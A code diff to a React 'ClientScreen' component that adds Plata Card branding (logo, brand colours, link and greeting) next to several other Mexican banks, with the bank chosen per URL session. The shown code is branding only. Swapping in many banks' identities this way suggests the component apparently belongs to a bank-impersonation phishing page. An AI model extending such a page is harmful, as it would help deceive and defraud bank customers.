@@ -25,6 +25,7 @@ import invexLogo from '../assets/invex_logo.png';
 import invexLogoWhite from '../assets/invex_logo_white.png';
 import banregioLogo from '../assets/banregio_logo.png';
 import banregioLogoWhite from '../assets/banregio_logo_white.png';
+import platacardLogo from '../assets/platacard_logo.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -331,6 +332,20 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
+    } else if (sessionData.banco === 'PLATACARD') {
+      return (
+        <header className="bg-[#333333] text-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src={platacardLogo} 
+              className="platacard-logo inline-block" 
+              alt="Plata Card" 
+              style={{height: '2.5rem', width: 'auto'}}
+            />
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -381,6 +396,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :
+              sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
               'https://www.banorte.com/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
@@ -394,6 +410,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
+              sessionData.banco === 'PLATACARD' ? 'text-[#FF5722]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href={
@@ -491,6 +508,7 @@ export default function ClientScreen() {
             sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :
             sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
             sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
+            sessionData.banco === 'PLATACARD' ? 'bg-[#333333]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -659,6 +677,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-2 px-4">
           <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'PLATACARD') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Plata Card</p>
         </div>
       );
     } else {
